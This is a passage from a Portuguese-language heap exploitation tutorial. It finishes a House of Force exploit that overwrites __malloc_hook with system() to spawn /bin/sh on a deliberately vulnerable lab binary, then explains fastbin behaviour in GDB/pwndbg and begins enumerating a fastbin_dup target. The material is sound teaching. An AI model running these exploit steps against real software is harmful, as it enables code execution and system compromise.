</span><span class="n">distance</span> <span class="o">=</span> <span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__malloc_hook</span> <span class="o">-</span> <span class="mh">0x20</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)</span>

<span class="c1"># solicitando um chunk do tamanho da distancia e preenchendo
</span><span class="n">malloc</span><span class="p">(</span><span class="n">distance</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Com estas linhas de código, podemos executar o script atrelado ao GDB, e verificar seu comportamento. Com o GDB pausado, podemos utilizar o comando <code class="language-plaintext highlighter-rouge">dq &amp;__malloc_hook-2</code> (utilizamos -2 ao invés de -16, pois o GDB, calcula os endereços de apontadores de forma diferente).</p>

<p><img src="/img/papers/heap_p1/paper_heap1_67.png" alt="Malloc hook" /></p>

<p>Como podemos ver na imagem acima, este <em>qwadword</em> nulo, representa o <em>mallok hook</em>, e como mencionado anteriormente, é um <em>function pointer</em>. Quando está nulo, da forma apresentada na imagem, a função <code class="language-plaintext highlighter-rouge">malloc()</code> funciona de forma normal. Porém, quando não é nulo, a chamada para <code class="language-plaintext highlighter-rouge">malloc()</code> é redirecionada para o endereço escrito na <em>mallok hook</em>.</p>

<p>O comando <code class="language-plaintext highlighter-rouge">top_chunk</code> mostra que nossa função armazenou o <em>top chunk</em> logo acima do <em>malloc hook</em>, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_68.png" alt="Endereço da top chunk" /></p>

<p>Isso significa que a próxima requisição feita a malloc, irá sobrescrever o <em>malloc hook</em>. Podemos comprovar esta teoria, adicionando mais uma linha de código ao script enviando alguns bytes inválidos como <code class="language-plaintext highlighter-rouge">0xdeadbeef</code> e monitorando o comportamento do programa. Nosso bloco de script fica desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># sobrescrevendo o top chunk size field
</span><span class="n">malloc</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">))</span>

<span class="c1"># calculando distancia entre a __malloc_hook e o top chunk
</span><span class="n">distance</span> <span class="o">=</span> <span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__malloc_hook</span> <span class="o">-</span> <span class="mh">0x20</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)</span>

<span class="c1"># solicitando um chunk do tamanho da distancia e preenchendo
</span><span class="n">malloc</span><span class="p">(</span><span class="n">distance</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span>

<span class="c1"># sobrescrevendo a malloc hook
</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">))</span>
<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Ao executar o programa atralado ao GDB, podemos utilizar o comando <code class="language-plaintext highlighter-rouge">print __malloc_hook</code> ou simplesmente <code class="language-plaintext highlighter-rouge">p __malloc_hook</code> para verificar o conteúdo da <em>malloc hook</em> conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_69.png" alt="Malloc hook sobrescrito" /></p>

<p>Isto comprova que a <em>malloc hook</em> foi sobrescrita, significando que a próxima vez que a função <code class="language-plaintext highlighter-rouge">malloc()</code> for chamada, a execução vai ser redirecionada para o enbdereço não mapeado <code class="language-plaintext highlighter-rouge">0xdeadbeef</code>. Podenmos confirmar utilizando o comando <code class="language-plaintext highlighter-rouge">continue</code> no GDB e mudando para a janela do script.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_70.png" alt="Programa parado" /></p>

<p>Conforme podemos observar, neste ponto o programa deveria solicitar os dados para preencher o <em>chunk</em>, mas o programa não está mais respondendo. Se olharmos na tela do GDB, veremos que o programa teve um <em>crash</em>, pois tentou executar um endereço não mapeado, que é justamente o que utilizamos, causando um <em>segmentation fault</em>, conforme mostrado na imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_71.png" alt="Invalid address" /></p>

<p>Isto significa que sobrescrever o <em>malloc hook</em> com um endereço válido, nos dá controle sobre o fluxo de execução do programa. A pergunta é, o que executar?</p>

<p>A resposta depende do objetivo da exploração, que pode ser um DoS, vazamento de informações sensíveis, entre outros. Mas em nosso caso, vamos obter um <code class="language-plaintext highlighter-rouge">shell</code>.</p>

<p>Uma forma de se obter um shell, é pela função <code class="language-plaintext highlighter-rouge">system()</code> contida na própria GLIBC.</p>

<p>A <code class="language-plaintext highlighter-rouge">man page</code> da função <code class="language-plaintext highlighter-rouge">system()</code>, nos mostra que é uma função simples que leva somente um argumento, uma <em>string</em> que aponta para um comando do <em>shell</em>, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_72.png" alt="Man page system" /></p>

<p>Portanto se redirecionarmos o fluxo de execução para a função <code class="language-plaintext highlighter-rouge">system()</code> da GLIBC, e passar o endereço da string “<code class="language-plaintext highlighter-rouge">/bin/sh</code>” como argumento, este processo nos dará uma <code class="language-plaintext highlighter-rouge">shell</code>.</p>

<p>Então, de volta ao script, no lugar dos bytes <code class="language-plaintext highlighter-rouge">0xdeadbeef</code>, vamos passar o endereço da nossa função <code class="language-plaintext highlighter-rouge">system()</code> de dentro da GLIBC. O bloco ficou desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># sobrescrevendo o top chunk size field
</span><span class="n">malloc</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">))</span>

<span class="c1"># calculando distancia entre a __malloc_hook e o top chunk
</span><span class="n">distance</span> <span class="o">=</span> <span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__malloc_hook</span> <span class="o">-</span> <span class="mh">0x20</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)</span>

<span class="c1"># solicitando um chunk do tamanho da distancia e preenchendo
</span><span class="n">malloc</span><span class="p">(</span><span class="n">distance</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span>

<span class="c1"># sobrescrevendo a malloc hook
</span><span class="n">malloc</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span><span class="p">))</span>
<span class="c1">#=========================================#
</span></code></pre></div></div>

<p>Além disso, qualquer argumento passado para a <code class="language-plaintext highlighter-rouge">malloc()</code> também será passado para <code class="language-plaintext highlighter-rouge">system()</code>. Isso significa que podemos “mascarar” o endereço da nossa string “/bin/sh” até mesmo como tamanho da nossa requisição (“size” na execução do programa).</p>

<p>Neste caso, como temos o vazamento do endereço da <em>heap</em>, podemos escrever a string “/bin/sh” diretamente em um <em>chunk</em>. Seguindo este raciocínio, nossa segunda requisição, que manda somente um “A” pode ser substituída pelo “/bin/sh” seguido de um <em>null byte</em> <code class="language-plaintext highlighter-rouge">\\0</code>.<br />
Em seguida, podemos fazer a quarta requisição, que apontará para a <code class="language-plaintext highlighter-rouge">heap + 0x30</code> que é o atual endereço da <code class="language-plaintext highlighter-rouge">system()</code>. O bloco final ficará desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># sobrescrevendo o top chunk size field
</span><span class="n">malloc</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">))</span>

<span class="c1"># calculando distancia entre a __malloc_hook e o top chunk
</span><span class="n">distance</span> <span class="o">=</span> <span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__malloc_hook</span> <span class="o">-</span> <span class="mh">0x20</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)</span>

<span class="c1"># solicitando um chunk do tamanho da distancia e preenchendo com "/bin/sh"
</span><span class="n">malloc</span><span class="p">(</span><span class="n">distance</span><span class="p">,</span> <span class="sa">b</span><span class="s">"/bin/sh</span><span class="se">\0</span><span class="s">"</span><span class="p">)</span>

<span class="c1"># sobrescrevendo a malloc hook
</span><span class="n">malloc</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span><span class="p">))</span>

<span class="c1"># criando variável que aponta para a system()
</span><span class="n">shell</span> <span class="o">=</span> <span class="n">heap</span> <span class="o">+</span> <span class="mh">0x30</span>

<span class="c1"># solicitando o chunk que executa "/bin/sh"
</span><span class="n">malloc</span><span class="p">(</span><span class="n">shell</span><span class="p">,</span> <span class="sa">b</span><span class="s">""</span><span class="p">)</span>
<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Agora, quando executamos nosso script, fora do GDB, em condições de produção, a última solicitação de <em>chunk</em> irá executar <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code>, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_73.png" alt="Shell obtido" /></p>

<p>Existe outra alternativa para obter o <em>shell</em>, pois a string “/bin/sh” já existe dentro da GLIBC. A razão disso, é porque funções como <code class="language-plaintext highlighter-rouge">system()</code> já fazem o equivalente a executar “/bin/sh” via <code class="language-plaintext highlighter-rouge">syscall execve</code> que também é utilizada para executar um comando passado pelo programa. Podemos substituir a linha de comando que contém a <em>string</em> “/bin/sh” pelo endereço da mesma <em>string</em> dentro da GLIBC, ficando desta forma: <code class="language-plaintext highlighter-rouge">shell = next(libc.search(b"/bin/sh"))</code>. Ao executarmos o script novamente, temos o mesmo resultado, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_74.png" alt="Shell obtido de forma alternativa" /></p>

<blockquote>
  <p>Em resumo, utilizamos a técnica <code class="language-plaintext highlighter-rouge">The house of Force</code> para sobrescrever o <em>top chunk size field</em> com o maior valor possível. Então fizemos uma nova requisição com o tamanho da distância entre a <em>heap</em> e a <em>malloc hook</em> no <em>data section</em> da própria GLIBC. A próxima requisição, sobrescreveu o <em>malloc hook</em> com o endereço da função <code class="language-plaintext highlighter-rouge">system()</code> também da própria GLIBC. Então fizemos uma requisição final com o endereço do comando que gostariamos que a <code class="language-plaintext highlighter-rouge">system()</code> executasse, mascarado no argumento <code class="language-plaintext highlighter-rouge">size</code> da malloc. A chamada para malloc se tornou <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code> nos dando uma <em>shell</em> no SO.</p>
</blockquote>

<h1 id="fastbin-dup">FASTBIN DUP</h1>

<p>Assim como no experimento anterior, vamos utilizar um binário propositalmente vulneráveil a fim de entender o funcionamento desta vulnerabilidade.</p>

<p><code class="language-plaintext highlighter-rouge">Fastbin dup</code>, ou “<em>fastbin duplicate</em>”, é uma técnica de exploração que se aproveita da função <code class="language-plaintext highlighter-rouge">free()</code> da malloc. porém, antes de iniciar a exploração, é necessário entender o conceito de <code class="language-plaintext highlighter-rouge">fastbin</code>.</p>

<h2 id="fastbins">Fastbins</h2>

<p>Além da alocação dinâmica de memória, algo que a malloc faz com eficiência é reciclar a memória <em>heap</em>, e esta é a finalidade da segunda função da malloc que iremos explorar, a <code class="language-plaintext highlighter-rouge">free()</code>.</p>

<p>A <code class="language-plaintext highlighter-rouge">free()</code> é outra função simples que necessita de somente um argumento, o apontador para o <em>chunk</em> que não é mais necessário para a execução do programa.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_75.png" alt="Estrutura da free()" /></p>

<p>Da perspectiva da malloc, um <em>chunk</em> que não é mais necessário é ligado a uma lista de <em>chunks</em> livres. Esta coleção de listas que tem como interesse na técnica <code class="language-plaintext highlighter-rouge">fastbin dup</code> é chamada de <code class="language-plaintext highlighter-rouge">fastbins</code>.</p>

<blockquote>
  <p><code class="language-plaintext highlighter-rouge">Fast</code>, pois os <em>chunks</em> nestas listas são reciclados de forma rápida e <code class="language-plaintext highlighter-rouge">bins</code>, porque é desta forma que a malloc chama os objetos de manutenção das listas.</p>
</blockquote>

<p>Os fastbins são pequenas coleções de <em>chunks</em> livres que são ligados de forma não circular, onde cada lista suporta <em>chunks</em> de tamanhos específicos.</p>

<p>Para entendermos de forma prática o comportamento dos <em>fastbins</em>, vamos debugar um binário em tempo de execução.</p>

<h3 id="analisando-o-comportamento-em-tempo-de-execução-1">Analisando o comportamento em tempo de execução</h3>

<p>Neste experimento, vamos utilizar basicamente as mesmas ferramentas anteriores, que são:</p>

<ul>
  <li>GDB (GNU Debugger)</li>
  <li>O plugin PWNDBG (encontrado em <a href="https://github.com/pwndbg/pwndbg">github.com/pwndbg/pwndbg</a>)</li>
  <li>O binário “fastbin” encontrado no material auxiliar deste paper</li>
</ul>

<p>Dentro do diretório dos binários, vamos iniciar o programa com o GDB e mudar o contexto para o código através do comando <code class="language-plaintext highlighter-rouge">set context-sections code</code>, inserir um <em>breakpoint</em> na função <code class="language-plaintext highlighter-rouge">main()</code> com o comando <code class="language-plaintext highlighter-rouge">b main</code>, e executar o programa com o comando <code class="language-plaintext highlighter-rouge">r</code>, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_76.png" alt="Iniciando o programa no GDB" /></p>

<p>A primeira coisa que podemos observar, é que a primeira ação do programa é requisitar três <em>chunks</em> com o tamanho mínimo. Podemos passar a quantidade de linhas que desejamos executar, como argumento do comando <code class="language-plaintext highlighter-rouge">next</code>, então <code class="language-plaintext highlighter-rouge">n 3</code> irá fazer estas requisições.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_77.png" alt="Executando os 3 primeiros comandos" /></p>

<p>Ao visualizarmos a <em>heap</em> com o comando <code class="language-plaintext highlighter-rouge">vis</code>, podemos observar que tudo foi feito de forma normal, conforme esperado, tendo 3 <em>chunks</em> com o tamanho mínimo de 24 bytes em <em>user data</em>, os chunks a, b, e c.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_78.png" alt="Visualizando os chunks" /></p>

<p>O painel de código nos mostra que os três próximos passos utilizam a função <code class="language-plaintext highlighter-rouge">free()</code> para reciclar os mesmos chunks na mesma ordem em que foram requisitados. Antes de continuar o fluxo, vamos checar os <em>fastbins</em> com o comando <code class="language-plaintext highlighter-rouge">fastbins</code>, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_79.png" alt="Fastbins" /></p>

<p>A saída do comando nos mostra que existem sete <em>fastbins</em>, cada um é responsável por armazenar <em>chunks</em> livres com tamanhos específicos entre <code class="language-plaintext highlighter-rouge">0x20</code> e <code class="language-plaintext highlighter-rouge">0x80</code> bytes. Embora existam <em>chunks</em> de tamanhos diferentes, estes são os tamanhos utilizados em condições padrão.<br />
O byte nulo <code class="language-plaintext highlighter-rouge">0x0</code> à direita de cada um, indica que estão vazios.</p>

<p>Vamos utilizar o comando <code class="language-plaintext highlighter-rouge">next</code>, seguido do comando <code class="language-plaintext highlighter-rouge">vis</code>, seguido do comando <code class="language-plaintext highlighter-rouge">fastbins</code> para visualizarmos as mudanças ocorridas.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_80.png" alt="Reciclando o primeiro chunk" /></p>

<p>Podemos observar que o <em>chunk</em> “a”, foi ligado ao <em>fastbin</em> de <code class="language-plaintext highlighter-rouge">0x20</code> bytes, lembrando que a malloc endereça seus <em>chunks</em> pelos seus metadados, e não pelo <em>user data</em>, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_81.png" alt="Link no fastbin" /></p>

<p>Porém, não é possível identificar na saída do comando, nenhuma alteração na estrutura da <em>heap</em>, portanto a origem desta informação que o PWNDBG nos mostra vem de outro lugar.</p>

<p>As <code class="language-plaintext highlighter-rouge">arenas</code> são estruturas nas quais a malloc mantém todos os metadados armazenados das <em>heaps</em>, consistindo primordialmente dos cabeçalhos das listas de <em>chunks</em> livres. Uma única arena pode administrar multiplos <em>heaps</em>, e uma arena é criada durante a criação da primeira <em>heap</em>, ou seja, toda vez que um programa utiliza a malloc pela primeira vez.</p>

<p>A função <code class="language-plaintext highlighter-rouge">main()</code> de um programa, recebe uma arena especial chamada de <code class="language-plaintext highlighter-rouge">main arena</code>, que reside no <em>data section</em> da própria GLIBC. E é da <code class="language-plaintext highlighter-rouge">main arena</code> que o PWNDBG captura as informações atuais dos <em>fastbins</em>.</p>

<p>Com o PWNDBG, é possível obtermos informações diretamente da <code class="language-plaintext highlighter-rouge">main arena</code>. Com o comando <code class="language-plaintext highlighter-rouge">dq &amp;main_arena 20</code>, podemos fazer o <em>dump</em> dos vinte primeiros <em>quadwords</em> da <code class="language-plaintext highlighter-rouge">main arena</code>, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_82.png" alt="20 quadwords da main arena" /></p>

<p>Se compararmos com as imagens anteriores, vemos que o <em>quadword</em> ressaltado na imagem abaixo, representa o <em>pointer</em> para o <em>top chunk</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_83.png" alt="Top chunk pointer" /></p>

<p>Ele rastreia o endereço do <em>top chunk</em> na própria arena, do qual indiretamente manipulamos na técnica <code class="language-plaintext highlighter-rouge">The House of Force</code>.<br />
A parte ressaltada na imagem abaixo, contém o cabeçalho do <em>fastbin</em> <code class="language-plaintext highlighter-rouge">0x20</code>, que neste momento contém o endereço do <em>chunk</em> “a”.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_84.png" alt="Endereço do fastbin" /></p>

<p>Toda vez que um chunk é enviado para o <em>fastbin</em>, seu endereço é escrito no cabeçalho do respectivo <em>fastbin</em> na arena.<br />
Se nós liberassemos com a função <code class="language-plaintext highlighter-rouge">free()</code> um <em>chunk</em> com o tamanho de <code class="language-plaintext highlighter-rouge">0x30</code> bytes, seu endereço seria escrito na parte ressaltada da imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_85.png" alt="Endereço do fastbin" /></p>

<p>Um <em>chunk</em> liberado com o tamanho de <code class="language-plaintext highlighter-rouge">0x40</code> bytes teria seu endereço gravado na arena na posição mostrada na imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_86.png" alt="Endereço do fastbin" /></p>

<p>E assim por diante…</p>

<p>Agora podemos avançar a execução do programa com os comandos <code class="language-plaintext highlighter-rouge">next</code>, <code class="language-plaintext highlighter-rouge">vis</code> e <code class="language-plaintext highlighter-rouge">fastbins</code> para verificarmos o comportamento.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_87.png" alt="Avançando a execução" /></p>

<p>Agora podemos observar que o <em>fastbin</em> <code class="language-plaintext highlighter-rouge">0x20</code> armazena dois <em>chunks</em>, o <em>chunk</em> “a” e o <em>chunk</em> “b” ressaltados na imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_88.png" alt="Comportamento do fastbin" /></p>

<p>Como podemos observar, o <em>fastbin</em> possui somente um “compartimento” por tamanho de <em>chunk</em>, empilhando os <em>chunks</em> pela ordem de sua liberação. Se utilizarmos o comando <code class="language-plaintext highlighter-rouge">!dq</code>, veremos o cabeçalho armazenado na arena agora pertence ao <em>chunk</em> “b”, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_89.png" alt="Arena" /></p>

<p>Isto ocorre, pois o restante dos metadados do chunk <code class="language-plaintext highlighter-rouge">0x20</code>, são guardados na própria <em>heap</em>, na imagem abaixo, podemos ver que o primeiro <em>quadword</em> do <em>user data</em> do <em>chunk</em> “b”, foi reaproveitado como um <em>forward pointer</em> ou “fd” apontando para o endereço do chunk “a”.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_90.png" alt="Fd no chunk b" /></p>

<p>Enquanto que o “fd” do <em>chunk</em> “a” é nulo, indicando que se trata do final da lista do <em>fastbin</em>.</p>

<p>O campo <em>user data</em> dos <em>chunks</em> pode ser reaproveitado desta forma, porque por padrão, os <em>chunks</em> só podem ser liberados quando não estão mais em uso pelo programa.</p>

<p>O comando <code class="language-plaintext highlighter-rouge">next</code> para liberar um novo <em>chunk</em>, seguido de <code class="language-plaintext highlighter-rouge">vis</code>, seguido de <code class="language-plaintext highlighter-rouge">fastbins</code> e por fim <code class="language-plaintext highlighter-rouge">!dq</code>, nos mostra que todo o processo se repete, toda vez que um <em>chunk</em> do mesmo tamanho é liberado, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_91.png" alt="Liberando o terceiro chunk" /></p>

<p>O <em>chunk</em> “c” agora é o primeiro <em>chunk</em> na <em>fastbin</em> de <code class="language-plaintext highlighter-rouge">0x20</code> bytes, com seu endereço escrito no cabeçalho da <code class="language-plaintext highlighter-rouge">main arena</code>. O primeiro <em>quadword</em> do <em>user data</em> do <em>chunk</em> “c” foi reaproveitado como um “fd” que aponta para o endereço do <em>chunk</em> “b”, o <em>chunk</em> “b” contém um “fd” que aponta para o <em>chunk</em> “a” e o “fd” do <em>chunk</em> “a” é nulo, indicando o fim da lista.</p>

<p>De forma abstrata, quando temos os <em>chunks</em> “a”, “b” e “c” alocados, temos um cenário mostrado como na imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_92.png" alt="Chunks alocados" /></p>

<p>Quando liberamos o <em>chunk</em> “a” com a função <code class="language-plaintext highlighter-rouge">free()</code>, seu “fd” se torna nulo e seu endereço é escrito no <em>fastbin</em> de <code class="language-plaintext highlighter-rouge">0x20</code> bytes na <code class="language-plaintext highlighter-rouge">main arena</code>, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_93.png" alt="Primeiro chunk liberado" /></p>

<p>Quando o <em>chunk</em> “b” é liberado, seu “fd” aponta para o <em>chunk</em> “a” e seu endereço é escrito no <em>fastbin</em> de <code class="language-plaintext highlighter-rouge">0x20</code> bytes na <code class="language-plaintext highlighter-rouge">main arena</code>, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_94.png" alt="Segundo chunk liberado" /></p>

<p>Por fim, quando o <em>chunk</em> “c” é liberado, seu “fd” aponta para o <em>chunk</em> “b” e seu endereço é escrito no <em>fastbin</em> de <code class="language-plaintext highlighter-rouge">0x20</code> bytes na <code class="language-plaintext highlighter-rouge">main arena</code>, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_95.png" alt="Terceiro chunk liberado" /></p>

<p>Outra forma de visualizar os <em>fastbins</em> diretamente na <code class="language-plaintext highlighter-rouge">main arena</code>, é interpretarmos como uma simples <em>stack</em>. O <em>stack pointer</em> para cada é armazenado na arena. Toda vez que um <em>chunk</em> de tamanho de <code class="language-plaintext highlighter-rouge">0x20</code> bytes é liberado, é adicionado ao topo da <em>stack</em> de <code class="language-plaintext highlighter-rouge">0x20</code> bytes, conforme ilustrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_96.png" alt="Stack do fastbin" /></p>

<p>Esta analogia é apropriada, pois os <em>fastbins</em> na arena possuem a estritura <code class="language-plaintext highlighter-rouge">LIFO</code> (<em>Last In First Out</em>), desta forma, quando o próximo <em>chunk</em> é liberado, ele entra na <em>stack</em> e fica no topo e será o primeiro a ser reutilizado na próxima chamada de <code class="language-plaintext highlighter-rouge">malloc()</code>, conforme ilustrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_97.png" alt="Stack do fastbin" /></p>

<p>Podemos confirmar este comportamento, utilizando o comando <code class="language-plaintext highlighter-rouge">next 3</code> no PWNDBG, que executará três novas requisições à malloc, os <em>chanks</em> “d”, “e” e “f”, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_98.png" alt="Solicitando 3 novos chunks" /></p>

<p>Podemos utilizar os comandos <code class="language-plaintext highlighter-rouge">print d</code>, <code class="language-plaintext highlighter-rouge">print e</code> e <code class="language-plaintext highlighter-rouge">print f</code> para confirmar que a malloc alocou o ultimo <em>chunk</em> liberado, o <em>chunk</em> “c”, seguido dos <em>chunks</em> “b” e “a” do topo da <em>stack</em> <em>fastbin</em> ao invés de utilizar mais memória do <em>top chunk</em>, conforme mostrado na imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_99.png" alt="Chunks realocados" /></p>

<blockquote>
  <p>Em resumo, os fastbins são coleções de listas de <em>chunks</em> livres que armazenam <em>chunks</em> de acordo com seu tamanho. Elas possuem a estrutura LIFO que funcionam como uma simples <em>stack</em>. O cabeçalho de cada <em>fastbin</em> é armazenado na arena, mas os links entre os <em>chunks</em> em uma <em>fastbin</em>, é armazenado no <em>user data</em> de cada <em>chunk</em> dentro da própria <em>heap</em>.<br />
Quando uma requisição de alocação de memória é feita, a malloc irá procurar primeiramente um <em>chunk</em> apropriado que esteja dentro da <em>fastbin</em> antes de tentar alocar esta memória do <em>top chunk</em>.</p>
</blockquote>

<h2 id="enumerando-o-binário">Enumerando o binário</h2>

<p>Assim como na exploração com a técnica <code class="language-plaintext highlighter-rouge">The house of Force</code>, o primeiro objetivo da exploração do <code class="language-plaintext highlighter-rouge">Fastbin Dup</code> é sobrescrever dados em seções do binário.</p>

<p>No diretório “fastbin_dup” no material de apoio, é possível encontrar o binário também chamado “fastbin_dup”. Vamos executá-lo através do GDB e enumerá-lo com o comando <code class="language-plaintext highlighter-rouge">checksec</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_100.png" alt="Enumerando o binário" /></p>

<p>Podemos observar que este binário foi compilado com <code class="language-plaintext highlighter-rouge">Full RELRO</code>, <code class="language-plaintext highlighter-rouge">Stack Canaries</code> e <code class="language-plaintext highlighter-rouge">NX</code> habilitados. Também podemos observar que o binário não possui <code class="language-plaintext highlighter-rouge">PIE Protector</code> e a GLIBC que utiliza é a versão <code class="language-plaintext highlighter-rouge">2.30</code>, versão esta, superior a do ultimo binário explorado.</p>

<p>Executando o programa sem configurar nenhum <em>breakpoint</em>, vemos um endereço da <code class="language-plaintext highlighter-rouge">libc</code> “vazado”, porém nenhum endereço da <em>heap</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_101.png" alt="Executando o programa" /></p>

<p>O programa solicita um “<em>username</em>” para dar continuidade, vamos preecnher com qualquer dado por agora. Após preencher o <em>username</em>, somos levados ao menu que já é familiar, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_102.png" alt="Menu do programa" /></p>

<p>A opção um, nos permite alocar até sete <em>chunks</em> e nos pede o tamanho que desejamos alocar, porém, quando tentamos alocar um valor alto, o programa nos responde uma mensagem informando que o maior <em>chunk</em> que podemos alocar, deve ter no máximo 120 bytes, ou seja <code class="language-plaintext highlighter-rouge">0x80</code> bytes, que é o maior <em>chunk</em> por padrão dos <em>fastbins</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_103.png" alt="Mensagem de resposta" /></p>

<p>Vamos solicitar um <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x30</code> bytes de <em>user data</em>, que pode ser um número entre 25 e 47 bytes. O programa vai solicitar os dados para preencher o <em>chunk</em>, vamos preencher com mais dados “lixo”, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_104.png" alt="Requisitando um chunk" /></p>

<p>Agora podemos pausar o GDB e utilizar o comando <code class="language-plaintext highlighter-rouge">vis</code>, para inspecionar a <em>heap</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_105.png" alt="Inspecionando a heap" /></p>

<p>Tudo exatamente conforme esperado, temos um <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x30</code> bytes, nossos “A” preenchendo o <em>user data</em> seguido do <em>top chunk</em>. Podemos continuar a execução do programa com o comando <code class="language-plaintext highlighter-rouge">continue</code> para visualizar o menu novamente.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_106.png" alt="Continuando a execução" /></p>

<p>A opção dois, nos permite liberar um <em>chunk</em>, informando seu índice começando em 0, vamos liberar nosso primeiro <em>chunk</em> conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_107.png" alt="Liberando um chunk" /></p>

<p>Agora podemos pausar o GDB e checar a <em>heap</em> com o comando <code class="language-plaintext highlighter-rouge">vis</code> e os <em>fastbins</em> com o comando <code class="language-plaintext highlighter-rouge">fastbins</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_108.png" alt="Checando heap e fastbins" /></p>

